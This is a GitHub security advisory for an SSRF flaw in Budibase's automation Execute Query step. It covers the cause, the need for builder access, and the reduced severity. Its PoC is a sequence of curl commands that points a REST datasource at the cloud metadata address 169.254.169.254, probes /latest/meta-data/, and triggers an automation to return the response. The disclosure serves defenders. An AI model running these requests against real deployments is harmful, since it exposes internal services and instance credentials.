# [M] Budibase: SSRF via User-Controlled queryId in Automation Execute Query Step

## Summary
Severity: Medium
Advisory: GHSA-6964-pp88-6wp9
CVE: CVE-2026-48128
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N (CVSS_V4)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-6964-pp88-6wp9
Type: github-advisory

## Affected
- npm: `budibase` — affected >=0 <3.39.0

## Details
### Summary

The executeQuery automation step in Budibase accepts a queryId from automation step inputs and passes it directly to the query execution controller without additional validation. When combined with a REST datasource configured to target internal infrastructure, this creates a server-side request forgery path where automation execution causes the Budibase server to make outbound HTTP requests to attacker-influenced destinations. The automation output then returns the response, potentially exposing internal service data.

### Details

Inside the execute query automation step, the queryId value and any additional query parameters from `inputs.query` are assembled into a request context and forwarded to `queryController.executeV2AsAutomation`. The constructed context looks like the following:

```typescript
const ctx: any = buildCtx(appId, emitter, {
  body: {
    parameters: rest,
  },
  params: {
    queryId,
  },
  user: context.user,
})
```

No validation is performed to confirm that the referenced query is appropriate for automation use, that the associated datasource targets an allowlisted destination, or that the supplied parameters do not override security-sensitive fields. The `context.user` value is also forwarded directly from automation context into the request, which may allow caller identity to be influenced by automation binding inputs.

To reach exploitation, an attacker needs builder-level access to the Budibase application. With that access, they can create a REST datasource with a base URL pointing to an internal network endpoint such as a cloud metadata service, create a query against that datasource, and then create an automation whose Execute Query step references that query. When the automation is triggered, the Budibase server issues the HTTP request originating from its own network context, and the response is captured in the automation output.

The key limitation, reflected in the revised severity, is that builder access already permits direct datasource configuration. A builder can configure a REST datasource and test it directly without involving the automation layer at all. The automation execute query path therefore does not provide a meaningful privilege escalation beyond what a builder role already permits. The finding is technically valid as an SSRF condition but the preconditions required to exploit it are equivalent to the preconditions for directly interacting with datasources.

### PoC

```bash
curl -s -X POST "$BUDIBASE_HOST/api/datasources" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{
    "datasource": {
      "name": "internal-meta",
      "type": "REST",
      "source": "REST",
      "config": {
        "url": "http://169.254.169.254",
        "rejectUnauthorized": false,
        "defaultHeaders": {}
      }
    }
  }'

curl -s -X POST "$BUDIBASE_HOST/api/queries" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d "{
    \"datasourceId\": \"$DATASOURCE_ID\",
    \"name\": \"meta-probe\",
    \"queryVerb\": \"read\",
    \"fields\": {
      \"path\": \"/latest/meta-data/\",
      \"queryString\": \"\",
      \"headers\": {},
      \"requestBody\": \"\"
    },
    \"parameters\": [],
    \"transformer\": \"return data\",
    \"schema\": {}
  }"

curl -s -X POST "$BUDIBASE_HOST/api/automations" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d "{
    \"name\": \"ssrf-test\",
    \"definition\": {
      \"trigger\": {
        \"event\": \"app:trigger\",
        \"stepId\": \"APP\",
        \"inputs\": {},
        \"schema\": {\"inputs\": {\"properties\": {}, \"required\": []}},
        \"type\": \"TRIGGER\",
        \"id\": \"trigger1\"
      },
      \"steps\": [
        {
          \"stepId\": \"EXECUTE_QUERY\",
          \"inputs\": {
            \"query\": {
              \"queryId\": \"$QUERY_ID\"
            }
          },
          \"schema\": {},
          \"type\": \"ACTION\",
          \"id\": \"step1\"
        }
      ]
    }
  }"

curl -s -X POST "$BUDIBASE_HOST/api/automations/$AUTOMATION_ID/trigger" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{}'
```

### Impact

An authenticated user with builder-level access to a Budibase application can cause the Budibase server to issue HTTP requests to internal network endpoints, including cloud instance metadata services, by configuring a REST datasource targeting those endpoints and referencing the resulting query from an automation Execute Query step. Response content from the internal service is returned in the automation run output. Because builder access already permits direct datasource configuration and testing, this path does not represent a meaningful escalation of privilege beyond the builder role. The practical impact is limited to environments where builder access is granted to partially trusted users and where network-level controls do not restrict outbound HTTP from the Budibase server process.

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-6964-pp88-6wp9
- https://nvd.nist.gov/vuln/detail/CVE-2026-48128
- https://github.com/Budibase/budibase
